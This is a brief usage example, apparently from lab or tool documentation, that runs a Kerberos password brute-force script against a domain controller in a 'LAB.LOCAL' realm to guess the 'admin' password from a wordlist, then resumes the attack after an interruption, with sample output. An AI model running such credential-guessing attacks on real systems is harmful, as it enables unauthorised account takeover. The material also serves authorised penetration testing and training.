# Start attack
python3 kerb_bruteforce_advanced.py \
    -r LAB.LOCAL \
    -k 192.168.88.20 \
    -u admin \
    -p large_wordlist.txt \
    --smart

# ... Ctrl+C after 500 attempts ...

# Resume later
python3 kerb_bruteforce_advanced.py \
    -r LAB.LOCAL \
    -k 192.168.88.20 \
    -u admin \
    -p large_wordlist.txt \
    --smart \
    --resume

# Output:
# [*] Resuming from previous session
# [*] Skipping 500 already-tested passwords
